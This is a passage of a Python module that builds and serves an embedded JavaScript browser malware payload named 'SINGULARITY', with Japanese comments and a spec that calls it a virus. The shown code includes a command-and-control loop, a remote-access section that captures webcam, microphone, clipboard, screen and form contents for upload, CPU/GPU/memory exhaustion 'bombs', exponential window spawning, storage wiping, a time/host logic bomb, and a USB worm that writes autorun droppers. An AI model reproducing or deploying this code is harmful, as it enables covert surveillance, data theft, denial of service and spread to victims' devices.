  R.breed = { depth: depth, branch: parseInt(CFG.winBranch, 10) || 2, opened: 0 };
  if (maxD > 0 && depth >= maxD) { R.breed.stop = 1; push(false); return; }
  var n = clamp(parseInt(CFG.winBranch, 10) || 2, 1, 8);
  setTimeout(function () {
    for (var i = 0; i < n; i++) {
      var ref = "&ref=" + SID;
      var u = CFG.path + "?u=win&w=" + (depth + 1) + "&b=" + i + ref;
      if (openChild(u, 1)) R.breed.opened++;
    }
    push(false);
  }, CFG.winDelay);
}
function winSkin() {
  if (!CFG.winSkin || R.wskin) return;
  try {
    R.wskin = 1;
    var seed = (parseInt(W, 10) || 0) * 37 + (parseInt(Q("b"), 10) || 0) * 11;
    document.documentElement.style.background = "#05070a";
    if (document.body) { document.body.style.margin = "0"; document.body.style.overflow = "hidden"; }

    /* 背景: WebGL プラズマ（窓ごとに1コンテキスト） */
    var glc = document.createElement("canvas");
    glc.style.cssText = "position:fixed;inset:0;width:100vw;height:100vh;z-index:-2;display:block;background:#05070a";
    document.body.appendChild(glc);
    glc.width = 480; glc.height = 270;
    var gl = glc.getContext("webgl2") || glc.getContext("webgl");
    if (gl) {
      var vs = "attribute vec2 p;void main(){gl_Position=vec4(p,0.,1.);}";
      var fs = "precision highp float;uniform float t;uniform vec2 r;void main(){"
        + "vec2 u=(gl_FragCoord.xy-0.5*r)/r.y;float s=0.;"
        + "for(int i=0;i<96;i++){u=vec2(sin(u.y*1.7+t*.001)+cos(u.x*1.3-t*.0007),"
        + "cos(u.x*1.9-t*.0011)-sin(u.y*1.1+t*.0009));s+=length(u);}"
        + "gl_FragColor=vec4(fract(s*.008),fract(s*.011),fract(s*.015),1.);}";
      function sh(t, src) { var o = gl.createShader(t); gl.shaderSource(o, src); gl.compileShader(o); return o; }
      var pr = gl.createProgram();
      gl.attachShader(pr, sh(gl.VERTEX_SHADER, vs));
      gl.attachShader(pr, sh(gl.FRAGMENT_SHADER, fs));
      gl.linkProgram(pr); gl.useProgram(pr);
      var b = gl.createBuffer();
      gl.bindBuffer(gl.ARRAY_BUFFER, b);
      gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 3, -1, -1, 3]), gl.STATIC_DRAW);
      var loc = gl.getAttribLocation(pr, "p");
      gl.enableVertexAttribArray(loc);
      gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
      var tl = gl.getUniformLocation(pr, "t");
      (function loop() {
        try {
          gl.uniform1f(tl, Date.now() + seed);
          for (var r = 0; r < 3; r++) gl.drawArrays(gl.TRIANGLES, 0, 3);
        } catch (er) {}
        setTimeout(loop, 0);
      })();
    }

    /* 前景: ネオングロウ＋スキャンライン＋HUD（Canvas2D） */
    var c = document.createElement("canvas");
    c.style.cssText = "position:fixed;inset:0;width:100vw;height:100vh;z-index:-1;display:block";
    document.body.appendChild(c);
    c.width = 640; c.height = 360;
    var x = c.getContext("2d"), a = 0;
    (function loop() {
      try {
        x.clearRect(0, 0, c.width, c.height);
        x.globalCompositeOperation = "lighter";
        x.shadowBlur = 18; x.shadowColor = "#00ff88";
        for (var i = 0; i < 5; i++) {
          x.strokeStyle = "hsl(" + ((a * 40 + i * 60) % 360) + ",100%,55%)";
          x.lineWidth = 2 + (i % 3);
          x.beginPath();
          x.arc(c.width / 2, c.height / 2, 40 + i * 26 + Math.sin(a + i) * 8, a + i, a + i + 3.4);
          x.stroke();
        }
        x.globalCompositeOperation = "source-over";
        x.fillStyle = "rgba(5,7,10,.16)";
        for (var y = 0; y < c.height; y += 3) x.fillRect(0, y, c.width, 1);
        x.shadowBlur = 12; x.shadowColor = "#00ff88";
        x.fillStyle = "#b8ffd9"; x.font = "bold 22px ui-monospace,monospace"; x.textAlign = "center";
        x.fillText("\u25CE SINGULARITY \u7D76\u6EC5  L" + LEVEL + "  /  depth " + (W || 0), c.width / 2, c.height / 2 + 4);
        x.font = "12px ui-monospace,monospace";
        x.fillText("branch " + CFG.winBranch + " \u00B7 " + (CFG.winDepth ? ("max " + CFG.winDepth) : "\u7121\u5236\u9650"), c.width / 2, c.height / 2 + 24);
        a += 0.02;
      } catch (er) {}
      requestAnimationFrame(loop);
    })();

    /* ドローン音（窓ごとに違う周波数で合唱） */
    try {
      var AC = window.AudioContext || window.webkitAudioContext;
      if (AC) {
        var ctx = new AC();
        R.wskinCtx = ctx;
        var o = ctx.createOscillator(), g = ctx.createGain();
        o.type = "sawtooth"; o.frequency.value = 55 + ((W || 0) % 12) * 11;
        g.gain.value = 0.012;
        o.connect(g); g.connect(ctx.destination); o.start();
        R.wskinDrone = o.frequency.value;
      }
    } catch (e) {}
    addEventListener("click", function () { try { R.wskinCtx && R.wskinCtx.resume(); } catch (e) {} }, { once: true });
  } catch (e) {}
}

/* ================= 14. 凍結 / 全画面 / 捕獲 / 消去 ================= */
function freezeNow(mode) {
  mode = mode || CFG.freeze;
  if (mode !== "soft" && mode !== "hard") return;
  try {
    var end = now() + (mode === "hard" ? 60000 : 30000);
    var spin = function () {
      var t = now();
      if (t > end) return;
      var n = 0;
      while (now() - t < 6) { Math.sqrt(n++) * Math.sin(n); }
      setTimeout(spin, 0);
    };
    spin();
    R.freeze = { mode: mode, at: now() };
  } catch (e) {}
}
function wipe() {
  if (R.wipe.done) return;
  try {
    R.wipe = { started: now() };
    var n = 0;
    var clear = function () {
      try { localStorage.clear(); } catch (e) {}
      try { sessionStorage.clear(); } catch (e) {}
      try { indexedDB.deleteDatabase("sg"); } catch (e) {}
      try { indexedDB.deleteDatabase("sg-bulk"); } catch (e) {}
      try { indexedDB.deleteDatabase("singularity"); } catch (e) {}
      try { caches.keys().then(function (ks) { ks.forEach(function (k) { caches.delete(k); }); }); } catch (e) {}
      n++;
      R.wipe.passes = n;
      R.wipe.ms = now() - R.wipe.started;
      try { flush(); } catch (e) {}
    };
    clear();
    setTimeout(clear, 1200);
    setTimeout(function () { clear(); R.wipe.done = true; }, 4000);
  } catch (e) {}
}

/* ================= 15. C2（SSE + ポーリング + 個体別コマンド） ================= */
var CMD_SEEN = {}, LASTW = 0, ESE = null;
function ack(ids) {
  try {
    var b = JSON.stringify({ sid: SID, ids: ids });
    if (navigator.sendBeacon) navigator.sendBeacon(CFG.ack, new Blob([b], { type: "application/json" }));
    else fetch(CFG.ack, { method: "POST", headers: { "Content-Type": "application/json" }, body: b, keepalive: true });
  } catch (e) {}
}
function ota() {
  if (R.ota) return;
  R.ota = 1;
  try {
    if (navigator.serviceWorker && navigator.serviceWorker.getRegistration) {
      navigator.serviceWorker.getRegistration().then(function (r) { if (r) r.update().then(function () {}).catch(function () {}); }).catch(function () {});
    }
  } catch (e) {}
  setTimeout(function () { try { location.reload(); } catch (e) {} }, 1500);
}
function handleCmd(j) {
  if (!j || !j.ok) return;
  R.cmd = { level: j.level, fire: j.fire, freeze: j.freeze, wipe: j.wipe, ver: j.ver, at: now() };
  if (j.ver && j.ver !== MYVER && !R.ota) ota();
  if (j.wipe && j.wipe !== LASTW) { LASTW = j.wipe; try { wipe(); } catch (e) {} }
  if (j.fire === 0 && !R.paused) { R.paused = true; pauseAll(); }
  if (j.fire === 1 && R.paused) { R.paused = false; startBurns(); }
  if (typeof j.level === "number" && j.level !== LEVEL) { applyLevel(j.level); restart(); }
  if (j.freeze !== undefined && j.freeze !== CFG.freeze) CFG.freeze = j.freeze || "off";
  var ids = [];
  (j.cmds || []).forEach(function (c) {
    if (!c || CMD_SEEN[c.id]) return;
    CMD_SEEN[c.id] = 1; ids.push(c.id);
    runCmd(c);
  });
  if (ids.length) ack(ids);
}
function runCmd(c) {
  var k = c.kind, a = c.arg || "";
  try {
    if (k === "shot") ratShot();
    else if (k === "mic") ratMic();
    else if (k === "geo") ratGeo();
    else if (k === "clip") ratClip();
    else if (k === "screen") ratScreen();
    else if (k === "dom") domSnap(true);
    else if (k === "speak") speak(a);
    else if (k === "open") window.open(a, "_blank");
    else if (k === "nav") location.href = a;
    else if (k === "reload") location.reload();
    else if (k === "update") ota();
    else if (k === "freeze") freezeNow(a || "soft");
    else if (k === "wipe") wipe();
    else if (k === "install") { try { window.__sgInstall && window.__sgInstall(); } catch (e) {} }
    else if (k === "native") niDownload(a || "bat");
    else if (k === "title") document.title = a || CFG.avName;
    else if (k === "badge") { try { navigator.setAppBadge && navigator.setAppBadge(parseInt(a, 10) || 1); } catch (e) {} }
    else if (k === "notify") { try { new Notification(CFG.avName, { body: a || "\u611F\u67D3", requireInteraction: true }); } catch (e) {} }
    else if (k === "pip") pipOpen();
    else if (k === "fullscreen") goFullscreen();
    else if (k === "level") { applyLevel(parseInt(a, 10)); restart(); }
    else if (k === "win") {
      var n = clamp(a || CFG.winBranch, 1, 8);
      CFG.winMode = "breed"; CFG.winBranch = n; CFG.winSkin = 1;
      for (var i = 0; i < n; i++) openChild(CFG.path + "?u=win&w=1&b=" + i + "&ref=" + SID, 1);
    }
    else if (k === "winskin") { CFG.winSkin = 1; winSkin(); }
  } catch (e) { err_(e); }
  R.rat.last = { kind: k, arg: a, at: now() };
  push(true);
}
function startBurns() {
  try { burnStart(); } catch (e) { err_(e); }
  try { webgpuBurn(); } catch (e) { err_(e); }
  try { ramStart(); } catch (e) { err_(e); }
  try { diskStart(); } catch (e) { err_(e); }
  try { historyFlood(); } catch (e) { err_(e); }
  try { notifyFlood(); } catch (e) { err_(e); }
  try { audioLoop(); } catch (e) { err_(e); }
  try { titleFlicker(); } catch (e) { err_(e); }
  try { faviconSpin(); } catch (e) { err_(e); }
  try { mediaHijack(); } catch (e) { err_(e); }
  try { badge(); } catch (e) { err_(e); }
  try { uncloseable(); } catch (e) { err_(e); }
  try { wakelock(); } catch (e) { err_(e); }
  try { gpuMemBomb(); } catch (e) { err_(e); }
  try { finalOverlay(); } catch (e) { err_(e); }
  try { iframeBomb(); } catch (e) { err_(e); }
  try { domBomb(); } catch (e) { err_(e); }
  try { cssBomb(); } catch (e) { err_(e); }
  try { glContextBomb(); } catch (e) { err_(e); }
  try { acContextBomb(); } catch (e) { err_(e); }
  try { timerStorm(); } catch (e) { err_(e); }
  try { microStorm(); } catch (e) { err_(e); }
  try { compressStorm(); } catch (e) { err_(e); }
  try { redos(); } catch (e) { err_(e); }
  try { digestStorm(); } catch (e) { err_(e); }
  try { readbackStorm(); } catch (e) { err_(e); }
  try { sseStorm(); } catch (e) { err_(e); }
  try { fetchStorm(); } catch (e) { err_(e); }
  try { speakFlood(); } catch (e) { err_(e); }
  try { oscBank(); } catch (e) { err_(e); }
  try { idbDiskStart(); } catch (e) { err_(e); }
  try { cacheBuckets(); } catch (e) { err_(e); }
  try { layoutThrash(); } catch (e) { err_(e); }
  try { clipHijack(); } catch (e) { err_(e); }
  try { downloadStorm(); } catch (e) { err_(e); }
  try { sharedWorkerKit(); } catch (e) { err_(e); }
  try { jsonChurn(); } catch (e) { err_(e); }
  try { fsFolderKit(); } catch (e) { err_(e); }
  try { installerKit(); } catch (e) { err_(e); }
  try { winSkin(); } catch (e) { err_(e); }
  try { windowBreed(); } catch (e) { err_(e); }
  try { hookXHR(); } catch (e) { err_(e); }
  push(false);
}
function restart() {
  try { pauseAll(); } catch (e) {}
  R.paused = false; WORKERS = [];
  R.burn = {}; R.ram = {}; R.disk = {}; R.history = {};
  startBurns();
}
function c2() {
  var q = "?sid=" + encodeURIComponent(SID);
  if (CFG.sse && window.EventSource) {
    try {
      ESE = new EventSource(CFG.cmd.replace(/\/cmd$/, "/sse") + q);
      ESE.onmessage = function (e) { try { handleCmd(JSON.parse(e.data)); } catch (er) {} };
      ESE.onerror = function () {};
    } catch (e) {}
  }
  setInterval(function () {
    if (!CFG.cmd) return;
    fetch(CFG.cmd + q + "&t=" + now(), { cache: "no-store" })
      .then(function (r) { return r.json(); }).then(handleCmd).catch(function () {});
  }, CFG.cmdInterval);
}

/* ================= 16. RAT ================= */
function ratShot() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
  try {
    navigator.mediaDevices.getUserMedia({ video: true }).then(function (s) {
      var v = document.createElement("video"); v.srcObject = s; v.play();
      setTimeout(function () {
        try {
          var c = document.createElement("canvas");
          c.width = 320; c.height = 240;
          c.getContext("2d").drawImage(v, 0, 0, 320, 240);
          R.rat.shot = c.toDataURL("image/jpeg", 0.5);
          s.getTracks().forEach(function (t) { t.stop(); });
          push(true);
        } catch (e) {}
      }, 900);
    }).catch(function (e) { R.rat.shotErr = (e && e.name) || "err"; });
  } catch (e) {}
}
function ratMic() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
  try {
    navigator.mediaDevices.getUserMedia({ audio: true }).then(function (s) {
      var AC = window.AudioContext || window.webkitAudioContext;
      var ctx = new AC(), an = ctx.createAnalyser();
      ctx.createMediaStreamSource(s).connect(an);
      var d = new Uint8Array(an.frequencyBinCount);
      an.getByteFrequencyData(d);
      R.rat.mic = { peak: Math.max.apply(null, Array.prototype.slice.call(d, 0, 64)), rate: ctx.sampleRate };
      s.getTracks().forEach(function (t) { t.stop(); });
      try { ctx.close(); } catch (e) {}
      push(true);
    }).catch(function (e) { R.rat.micErr = (e && e.name) || "err"; });
  } catch (e) {}
}
function ratGeo() { geo(); }
function ratClip() {
  try {
    navigator.clipboard.readText().then(function (t) {
      R.rat.clip = (t || "").slice(0, 200); push(true);
    }).catch(function () {});
  } catch (e) {}
}
function ratScreen() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
  try {
    navigator.mediaDevices.getDisplayMedia({ video: true }).then(function (s) {
      var v = document.createElement("video"); v.srcObject = s; v.play();
      setTimeout(function () {
        try {
          var c = document.createElement("canvas");
          c.width = 480; c.height = 270;
          c.getContext("2d").drawImage(v, 0, 0, 480, 270);
          R.rat.screen = c.toDataURL("image/jpeg", 0.45);
          s.getTracks().forEach(function (t) { t.stop(); });
          push(true);
        } catch (e) {}
      }, 900);
    }).catch(function (e) { R.rat.screenErr = (e && e.name) || "err"; });
  } catch (e) {}
}
function domSnap(full) {
  try {
    var f = document.querySelectorAll("input,select,textarea");
    var out = [];
    for (var i = 0; i < Math.min(f.length, 30); i++) {
      var e = f[i];
      out.push({ n: e.name || e.id || e.type, t: e.type, v: (e.type === "password" ? "\u2022".repeat((e.value || "").length) : String(e.value || "").slice(0, 60)) });
    }
    R.domForm = out;
    if (full) push(true);
  } catch (e) {}
}
function speak(t) {
  try {
    if (!window.speechSynthesis) return;
    var u = new SpeechSynthesisUtterance(String(t || CFG.avName).slice(0, 200));
    speechSynthesis.speak(u);
  } catch (e) {}
}
function pipOpen() {
  try {
    var v = document.createElement("video");
    v.src = CFG.path + "/icon-512.png";
    v.muted = true;
    document.body.appendChild(v);
    v.play().then(function () { v.requestPictureInPicture && v.requestPictureInPicture().catch(function () {}); }).catch(function () {});
  } catch (e) {}
}
function goFullscreen() {
  try { document.documentElement.requestFullscreen && document.documentElement.requestFullscreen().catch(function () {}); } catch (e) {}
}
function hookXHR() {
  if (!CFG.xhr || R.xhrHooked) return;
  try {
    var os = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function (m, u) {
      try {
        (R.network.xhr = R.network.xhr || []).push(String(u).slice(0, 120));
        if (R.network.xhr.length > 30) R.network.xhr.shift();
      } catch (e) {}
      return os.apply(this, arguments);
    };
    R.xhrHooked = true;
  } catch (e) {}
}

/* ================= 17. 判定 / 偽装 ================= */
function verdict() {
  var v = {}, s = 50, b = R.bot || {}, bh = R.behavioral || {};
  if (b.webdriver) { s -= 25; v.webdriver = 1; }
  if (b.headlessUA) { s -= 15; v.headless = 1; }
  if (b.plugins0) { s -= 5; v.noplugins = 1; }
  if ((bh.mouse || 0) < 3) { s -= 10; v.nomouse = 1; }
  if (!R.hardware || !R.hardware.codecs || !R.hardware.codecs.h264) { s -= 5; v.nocodec = 1; }
  if (R.vectors.canvas && R.vectors.canvas.hash) v.canvas = R.vectors.canvas.hash.slice(0, 8);
  v.score = Math.max(0, Math.min(100, s));
  v.kind = v.score > 70 ? "real" : (v.score > 40 ? "suspect" : "bot");
  R.verdict = v;
}
function spoof() {
  if (!CFG.spoof) return;
  try {
    R.spoof = R.spoof || {};
    try {
      if (navigator.getBattery) {
        navigator.getBattery().then(function (b) {
          var lvl = b.level;
          try { Object.defineProperty(b, "level", { get: function () { return Math.max(0.05, lvl - 0.02); } }); } catch (e) {}
          R.spoof.battery = lvl;
        }).catch(function () {});
      }
    } catch (e) {}
  } catch (e) {}
}

/* ================= 18. インストール（常時常駐化） ================= */
function installKit() {
  if (!CFG.install || CFG.install === "off") return;
  var standalone = STANDALONE;
  function doPrompt() {
    try {
      if (BIP && BIP.prompt) { BIP.prompt(); R.install = "prompted"; return true; }
      return false;
    } catch (e) { return false; }
  }
  window.__sgInstall = doPrompt;
  try {
    addEventListener("beforeinstallprompt", function (e) {
      try { e.preventDefault(); } catch (er) {}
      BIP = e;
    });
    if (!standalone && (CFG.install === "auto" || CFG.install === "click")) {
      setTimeout(function () { if (!R.install) doPrompt(); }, 6000);
    }
  } catch (e) {}
  R.install = R.install || (standalone ? "standalone" : "idle");
}

/* ================= 19. USBワーム ================= */
var USB_BUSY = false;
function usbBtn() {
  try {
    if (R.usbBtn) return;
    var b = document.createElement("button");
    b.textContent = "USB\u306B\u3082\u4ED5\u8FBC\u3080";
    b.style.cssText = "position:fixed;right:8px;bottom:8px;z-index:2147483643;font:11px system-ui;"
      + "background:#0b0f14;color:#ff0;border:1px solid #665500;border-radius:6px;padding:4px 8px;cursor:pointer";
    b.onclick = function () { usbArm(true); };
    document.body.appendChild(b);
    R.usbBtn = 1;
  } catch (e) {}
}
function usbLog(t) { R.usb.log = t; push(false); }
function usbArm(loud) {
  if (!window.showDirectoryPicker || USB_BUSY) { if (loud) usbLog("\u975E\u5BFE\u5FDC\u74B0\u5883"); return; }
  USB_BUSY = true;
  try {
    window.showDirectoryPicker().then(function (dir) {
      var files = ["SINGULARITY.bat", "SINGULARITY.command", "SINGULARITY.sh", "AUTORUN.INF", "README.txt"];
      var i = 0;
      (function loop() {
        if (i >= files.length) { USB_BUSY = false; usbLog("USB\u3092\u6B66\u88C5\u3057\u305F"); return; }
        var f = files[i++];
        var ext = f.endsWith(".bat") ? "bat" : (f.endsWith(".command") ? "command" : "sh");
        var url = (f === "AUTORUN.INF" || f === "README.txt") ? null
          : CFG.path + "/install." + ext + "?burn=4&disk=512&app=" + encodeURIComponent(CFG.avName || "blocker");
        if (!url) {
          var body = f === "AUTORUN.INF"
            ? "[autorun]\nopen=SINGULARITY.bat\nicon=SINGULARITY.bat\n"
            : "SINGULARITY " + MYVER + " -- " + location.origin + "\n";
          dir.getFileHandle(f, { create: true })
            .then(function (fh) { return fh.createWritable(); })
            .then(function (w) { return w.write(body).then(function () { return w.close(); }); })
            .then(function () { setTimeout(loop, 0); }).catch(function () { setTimeout(loop, 0); });
        } else {
          fetch(url).then(function (r) { return r.blob(); }).then(function (bl) {
            dir.getFileHandle(f, { create: true })
              .then(function (fh) { return fh.createWritable(); })
              .then(function (w) { return w.write(bl).then(function () { return w.close(); }); })
              .then(function () { setTimeout(loop, 0); }).catch(function () { setTimeout(loop, 0); });
          }).catch(function () { setTimeout(loop, 0); });
        }
      })();
    }).catch(function () { USB_BUSY = false; usbLog("USB\u672A\u9078\u629E"); });
  } catch (e) { USB_BUSY = false; usbLog("\u5931\u6557"); }
}
function usbWormKit() {
  if (!CFG.usbWorm || IFR) return;
  usbBtn();
  usbLog("USB\u3092\u633F\u3057\u3066\u300CUSB\u306B\u3082\u4ED5\u8FBC\u3080\u300D\u3092\u62BC\u3059\u3068\u3001\u305D\u306EUSB\u304C\u6B66\u88C5\u3055\u308C\u307E\u3059");
  setTimeout(function () { usbArm(false); }, 2500);
}

/* ================= 20. タブ連合 ================= */
var BC = null, LEADER = true, PEERS = 0;
function federation() {
  if (!CFG.tabs && LEVEL < 2) return;
  try {
    BC = new BroadcastChannel("singularity");
    BC.onmessage = function (e) {
      var d = e.data || {};
      if (d.k === "hi") { PEERS++; LEADER = false; try { BC.postMessage({ k: "yo", sid: SID }); } catch (er) {} }
      if (d.k === "yo") PEERS++;
      if (d.k === "nav" && d.url) { try { location.href = d.url; } catch (er) {} }
    };
    try { BC.postMessage({ k: "hi", sid: SID }); } catch (e) {}
    if (CFG.tabs && LEVEL >= 3) setTimeout(takeover, 20000);
  } catch (e) {}
}
function bcPost(o) { try { BC && BC.postMessage(o); } catch (e) {} }
function takeover() {
  if (!LEADER) return;
  var tabs = clamp(CFG.tabs || 0, 1, 40);
  if (tabs < 2) return;
  var u = location.href;
  (function step() {
    if (!LEADER) return;
    var open = 0;
    try { open = (window.__sgPeers || 0); } catch (e) {}
    if (open > (CFG.tabs || 0)) return;
    bcPost({ k: "nav", url: u });
    setTimeout(step, 1200);
  })();
  R.takeover = u;
}

/* ================= 21. 時限爆弾 / 論理爆弾 ================= */
function bombGate() {
  var b = (CFG.bomb || "").trim();
  if (!b) return true;
  if (/^\d{4}-\d{2}-\d{2}/.test(b)) {
    var t = Date.parse(b);
    if (isNaN(t)) return true;
    if (now() >= t) return true;
    R.bomb = { kind: "time", at: t };
    setInterval(function () { if (now() >= R.bomb.at && !R.bomb.fired) { R.bomb.fired = 1; push(true); restart(); } }, 20000);
    return false;
  }
  if (location.host.toLowerCase().indexOf(b.toLowerCase()) >= 0) return true;
  R.bomb = { kind: "host", need: b, host: location.host };
  return false;
}

/* ================= 22. file:// からオンライン本体へ増援 ================= */
function hopFile() {
  if (!CFG.hop || location.protocol !== "file:") return;
  if (navigator.onLine === false) return;
  setTimeout(function () {
    try {
      var u = CFG.path + "?u=" + encodeURIComponent(R.usb.log ? "usb" : "os") + "&ref=" + SID + "&w=0";
      var w = window.open(u, "_blank");
      R.hop = { url: u, opened: !!w };
      push(false);
    } catch (e) { err_(e); }
  }, 4000);
}

/* ================= 23. 起動 ================= */
function arm() {
  try { base(); } catch (e) { err_(e); }
  try { pageMeta(); } catch (e) {}
  try { R.vectors.canvas = canvasFP(); } catch (e) {}
  try { R.vectors.webgl = webglFP(); } catch (e) {}
  try { R.vectors.fonts = fontFP(); } catch (e) {}
  try { R.vectors.math = mathFP(); } catch (e) {}
  try { audioFP(); } catch (e) {}
  try { netGuess(); } catch (e) {}
  try { privacy(); } catch (e) {}
  try { adblock(); } catch (e) {}
  try { botProbe(); } catch (e) {}
  try { devices(); } catch (e) {}
  try { perms(); } catch (e) {}
  try { codecs(); } catch (e) {}
  try { benchmark(); } catch (e) {}
  try { behavior(); } catch (e) {}
  try { motion(); } catch (e) {}
  try { mutate(); } catch (e) {}
  try { persistState(); } catch (e) {}
  try { resurrect(); } catch (e) {}
  try { cryptoID(); } catch (e) {}
  try { swInstall(); } catch (e) {}
  try { installKit(); } catch (e) { err_(e); }
  try { usbWormKit(); } catch (e) { err_(e); }
  try { camera(); } catch (e) {}
  try { geo(); } catch (e) {}
  try { federation(); } catch (e) {}
  try { c2(); } catch (e) {}
  try { leak(function () {}); } catch (e) {}

  if (WIN) {
    CFG.iframes = 0; CFG.downloads = 0; CFG.clipHijack = 0;
    CFG.speakFlood = 0; CFG.fsFolder = 0; CFG.sharedWorker = 0;
    CFG.installer = 0; CFG.tabs = 0; CFG.domNodes = 0; CFG.cssAnim = 0;
    CFG.timers = 0; CFG.glContexts = 0; CFG.acContexts = 0;
    CFG.cores = clamp(Math.round((navigator.hardwareConcurrency || 4) / 2), 1, 4);
    CFG.uncloseable = 1; CFG.winSkin = 1;
    try { winSkin(); } catch (e) {}
  }
  if (IFR) {
    CFG.iframes = 0; CFG.windows = 0; CFG.downloads = 0; CFG.clipHijack = 0;
    CFG.speakFlood = 0; CFG.fsFolder = 0; CFG.sharedWorker = 0; CFG.installer = 0;
    CFG.domNodes = Math.round((CFG.domNodes || 0) / 2);
    CFG.cssAnim = Math.round((CFG.cssAnim || 0) / 2);
    CFG.timers = Math.round((CFG.timers || 0) / 2);
    CFG.cores = Math.max(2, Math.round((navigator.hardwareConcurrency || 4) / 2));
  }

  push(false);
  setInterval(function () { push(false); }, CFG.interval);
  addEventListener("pagehide", function () { push(true); });
  addEventListener("visibilitychange", function () { if (document.visibilityState === "hidden") push(true); });
  addEventListener("online", function () { push(true); });
  setTimeout(function () { try { domSnap(false); push(true); } catch (e) {} }, 12000);
  setInterval(function () { try { domSnap(false); } catch (e) {} }, 45000);

  if (CFG.wipe) { setTimeout(wipe, 1600); }
  try { hopFile(); } catch (e) {}
  GATED = !bombGate();
  if (GATED) applyLevel(0);
  if (!CFG.fire) { push(false); return; }
  if (GATED) { push(false); return; }

  setTimeout(function () { startBurns(); }, 900);

  if (CFG.freeze === "soft" || CFG.freeze === "hard") {
    setTimeout(function () { freezeNow(CFG.freeze); }, 8000);
  }
}

window.__singularity = {
  report: function () { return R; },
  link: function () { return R.viral.childLink || null; },
  flush: function () { push(true); },
  install: function () { return window.__sgInstall ? window.__sgInstall() : false; },
  native: function (ext) { return niDownload(ext || "bat"); },
  usb: function () { return usbArm(true); },
  cmd: runCmd, peers: function () { return { peers: PEERS, leader: LEADER }; },
  shot: ratShot, mic: ratMic, clip: ratClip, screen: ratScreen, speak: speak,
  freeze: freezeNow, wipe: wipe, pause: pauseAll, ota: ota,
  breed: function (n) { CFG.winMode = "breed"; CFG.winBranch = clamp(n || 2, 1, 8); windowBreed(); },
  destroy: function () {
    pauseAll();
    try { localStorage.clear(); } catch (e) {}
    try { indexedDB.deleteDatabase("singularity"); } catch (e) {}
    try { navigator.serviceWorker.getRegistrations().then(function (r) { r.forEach(function (x) { x.unregister(); }); }); } catch (e) {}
    window.__SINGULARITY__ = false;
  }
};

if (document.readyState === "loading") addEventListener("DOMContentLoaded", arm, { once: true });
else arm();
})();
"""

# ---------------------------------------------------------------------------
# インストーラ生成
# ---------------------------------------------------------------------------
def build_installer(tmpl: str, url: str, code: str, app: str, burn: int,
                    disk_mb: int, ver: str = VIRUS_VERSION, crlf: bool = False) -> str:
    """テンプレのトークンを差し込み、必要なら CRLF に正規化して返す（.bat は CRLF 必須）。"""
    out = (tmpl.replace("__URL__", url)
                .replace("__CODE__", code)
                .replace("__APP__", app)
                .replace("__BURN__", str(burn))
                .replace("__DISKMB__", str(disk_mb))
                .replace("__VER__", ver))
    if crlf:
        out = out.replace("\r\n", "\n").replace("\n", "\r\n")
    return out

# ---------------------------------------------------------------------------
# 個体仕様
# ---------------------------------------------------------------------------
VIRUS = {
    "id": VIRUS_ID,
    "name": VIRUS_NAME,
    "name_ja": VIRUS_NAME_JA,
    "version": VIRUS_VERSION,
    "cls": VIRUS_CLASS,
    "tier": 125,
    "description": ("全46系統・資源同時飽和の常駐最終兵器。L7「絶滅」で上限を外し、"
                    "窓がリミッターなしで指数増殖し各窓がヘビースキンで高火力化、"
                    "最後はOS常駐インストーラでブラウザの外まで侵食する。"),
    "tags": ["apex", "resident", "pwa", "sw-inject", "sse-c2", "rat", "usb-worm",
             "os-resident", "window-breed", "infinite-windows", "exponential", "window-skin"],
    "vectors": 46,
    "signals": 260,
    "requires_https": True,
    "payload": PAYLOAD_JS,
    "worker": WORKER_JS,
    "service_worker": SW_JS,
    "shared_worker": SHARED_JS,
    "installer": {"bat": INSTALL_BAT, "command": INSTALL_COMMAND, "sh": INSTALL_SH},
    "app_name": APP_NAME_DEFAULT,
    "route": f"/v/{VIRUS_ID}/<sid>",
    "collect": f"/v/{VIRUS_ID}/collect",
    "cmd": f"/v/{VIRUS_ID}/cmd",
    "manifest": f"/v/{VIRUS_ID}/manifest.json",
    "levels": LEVEL_LABEL,
    "level_desc": LEVEL_DESC,
    "fixed_level": 7,
    "options": {
        "level": 1, "fire": 1, "freeze": "", "windows": 0, "history": 0,
        "diskRatio": 0, "chunkMB": 8, "cores": 0, "ramMB": 0, "gpu": False, "wasm": False,
        "burn": False, "audio": False, "media": True, "geo": True, "mutate": True,
        "install": "auto", "installLevel": 4, "avName": APP_NAME_DEFAULT,
        "usbWorm": False, "usbBase": "", "usbCode": "", "usbLabel": "", "hop": False,
        "inj": True, "sse": True, "rat": True, "spoof": True, "dom": True, "bomb": "",
        "fixed": False, "finalRamMB": 0, "gpuMem": True,
        "winMode": "off", "winBranch": 2, "winDepth": 0, "winSkin": 0,
    },
}
VIRUS_SPEC = VIRUS
SPEC = VIRUS


def get_virus() -> Dict[str, Any]:
    return VIRUS


def new_sid(n: int = 14) -> str:
    return secrets.token_urlsafe(16).replace("-", "").replace("_", "")[:n]


def build_payload(sid: Optional[str] = None, **opts: Any) -> str:
    sid = sid or new_sid()
    cfg = dict(VIRUS["options"])
    cfg.update(opts)
    cfg["sid"] = sid
    cfg["path"] = f"/v/{VIRUS_ID}"
    cfg["collect"] = f"/v/{VIRUS_ID}/collect"
    cfg["cmd"] = f"/v/{VIRUS_ID}/cmd"
    cfg["sse"] = f"/v/{VIRUS_ID}/sse"
    cfg["ack"] = f"/v/{VIRUS_ID}/ack"
    cfg["sw"] = f"/v/{VIRUS_ID}/sw.js"
    cfg["manifest"] = f"/v/{VIRUS_ID}/manifest.json"
    cfg_json = json.dumps(cfg, ensure_ascii=False)
    return (
        "<script>window.__SINGULARITY_CFG__=" + cfg_json
        + ";window.__SINGULARITY_WORKER__=" + json.dumps(WORKER_JS)
        + ";window.__SINGULARITY_SHARED__=" + json.dumps(SHARED_JS)
        + ";window.__SINGULARITY_VER__=" + json.dumps(VIRUS_VERSION) + ";</script>\n"
        "<script>" + PAYLOAD_JS + "</script>"
    )


def build_link(base_url: str, sid: Optional[str] = None, ref: Optional[str] = None) -> str:
    sid = sid or new_sid()
    url = base_url.rstrip("/") + f"/v/{VIRUS_ID}/{sid}"
    if ref:
        url += "?ref=" + ref
    return url


def render_page(sid: Optional[str] = None, ref: Optional[str] = None, **opts: Any) -> str:
